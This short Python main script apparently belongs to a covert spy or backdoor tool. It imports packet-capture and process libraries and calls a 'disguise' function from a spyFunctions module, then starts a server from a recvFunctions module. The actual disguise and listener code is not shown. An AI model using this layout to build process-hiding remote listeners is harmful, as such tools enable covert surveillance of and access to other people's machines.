import socket
from struct import *
import pcapy
import sys
import psutil
import time
import threading
import signal
import config
import spyFunctions
import recvFunctions
# import sendFunctions
# import utils

running = True

def main(argv):
	spyFunctions.disguise()
	recvFunctions.startServer()
	try:
		while(True):
			pass
	except (KeyboardInterrupt, SystemExit):
		sys.exit()

if __name__ == "__main__":
	main(sys.argv)